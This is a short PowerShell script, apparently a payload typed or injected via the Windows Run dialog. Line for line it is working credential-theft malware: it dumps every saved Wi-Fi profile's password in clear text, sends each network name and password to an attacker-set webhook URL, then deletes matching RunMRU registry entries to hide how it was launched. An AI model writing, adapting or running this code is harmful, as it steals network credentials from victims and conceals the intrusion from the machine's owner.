# Use this line if you intrested in typing your webhook inside file;
# $WEBHOOK =""





$profiles = netsh wlan show profile |
            Select-String "All User Profile" |
            ForEach-Object {
                ($_ -split ":",2)[1].Trim()
            }

foreach ($PROFILE_NAME in $profiles) {

    $passLine = netsh wlan show profile $PROFILE_NAME key=clear |
                Select-String "Key Content"

    if ($passLine) {
        $PASSWORD = ($passLine -split ":",2)[1].Trim()

        if ($PASSWORD -ne "") {
            $PAYLOAD = @{
    content = "Network: $PROFILE_NAME Password: $PASSWORD"
} | ConvertTo-Json

Invoke-RestMethod -Uri $WEBHOOK `
    -Method Post `
    -ContentType "application/json" `
    -Body $PAYLOAD | Out-Null
        }
        
    }
    
}
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
$reg = Get-ItemProperty $path

foreach ($p in $reg.PSObject.Properties) {
    if ($p.Value -match '(?i)powershell\s+$webhook') {
        Remove-ItemProperty -Path $path -Name $p.Name -ErrorAction SilentlyContinue
    }
}





